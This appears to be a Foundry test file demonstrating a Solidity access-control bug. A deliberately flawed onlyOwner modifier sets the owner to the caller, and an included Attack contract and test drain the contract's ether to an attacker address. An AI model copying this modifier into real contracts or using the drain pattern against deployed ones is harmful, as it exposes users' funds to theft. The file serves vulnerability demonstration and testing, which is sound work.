pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// VulnerableContract and Attack definitions as provided in the vulnerable contract file

contract VulnerableContract {
    address public owner;

    modifier onlyOwner() {
        // Flawed: sets owner to msg.sender instead of checking authorization
        owner = msg.sender;
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    // Accept Ether
    receive() external payable {}
}

contract Attack {
    VulnerableContract public vulnerable;

    constructor(address payable _vulnerableAddress) {
        vulnerable = VulnerableContract(_vulnerableAddress);
    }

    // Attack function that exploits the flawed onlyOwner modifier
    function attack() public {
        vulnerable.withdraw();
    }

    // Accept Ether
    receive() external payable {}
}

contract ImproperModifierTest is Test {
    VulnerableContract vulnerable;
    uint constant depositAmount = 1 ether;

    function setUp() public {
        // Deploy the vulnerable contract
        vulnerable = new VulnerableContract();
        // Fund the vulnerable contract with some ether
        (bool sent, ) = payable(address(vulnerable)).call{value: depositAmount}('');
        require(sent, "Funding vulnerable contract failed");
        assertEq(address(vulnerable).balance, depositAmount, "Deposit unsuccessful");
    }

    // Test that demonstrates the vulnerability
    function testExploit() public {
        // Set up an attacker address
        address attacker = address(0xBEEF);
        vm.deal(attacker, 1 ether);

        // Start pranking as attacker
        vm.startPrank(attacker);

        // Deploy the attack contract as the attacker
        Attack attackContract = new Attack(payable(address(vulnerable)));

        // Check initial balance of the Attack contract (should be 0)
        uint initialAttackBalance = address(attackContract).balance;
        emit log_named_uint("Attacker contract balance before attack", initialAttackBalance);
        assertEq(initialAttackBalance, 0, "Attack contract should start with 0 balance");

        // Call attack which triggers withdraw() in VulnerableContract
        attackContract.attack();

        // End prank
        vm.stopPrank();

        // Validate that the vulnerable contract is drained
        uint finalVulnBalance = address(vulnerable).balance;
        emit log_named_uint("Vulnerable contract balance after attack", finalVulnBalance);
        assertEq(finalVulnBalance, 0, "Vulnerable contract should have 0 balance after attack");

        // Validate that the attacker contract has received the funds
        uint finalAttackBalance = address(attackContract).balance;
        emit log_named_uint("Attacker contract balance after attack", finalAttackBalance);
        assertEq(finalAttackBalance, depositAmount, "Attack contract should receive the deposited funds");
    }

    // Fallback function to receive ether in this test contract if needed
    receive() external payable {}
}
